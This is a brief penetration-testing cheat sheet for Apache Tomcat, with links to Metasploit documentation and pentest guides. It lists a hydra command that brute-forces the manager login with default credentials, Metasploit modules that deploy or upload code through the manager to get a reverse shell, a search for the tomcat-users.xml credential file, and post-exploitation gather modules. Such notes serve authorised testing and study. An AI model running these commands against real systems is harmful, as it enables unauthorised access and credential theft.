# Apache Tomcat

`$ hydra -C Seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://<IP>:<PORT>/manager/html`

```
msf > exploit/multi/http/tomcat_mgr_deploy

msf > use exploit/multi/http/tomcat_mgr_upload
```

https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/http/tomcat_mgr_deploy.md

https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/http/tomcat_mgr_upload.md

https://vk9-sec.com/apache-tomcat-manager-war-reverse-shell/

`$ find -name tomcat-users.xml 2>/dev/null`

`meterpreter > run post/windows/gather/enum_tomcat`

`msf > use post/multi/gather/tomcat_gather`

https://viperone.gitbook.io/pentest-everything/everything/ports/ports-8080-8180-apache-tomcat

https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/gather/tomcat_gather.md

---
## References

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat

https://charlesreid1.com/wiki/Metasploitable/Apache/Tomcat_and_Coyote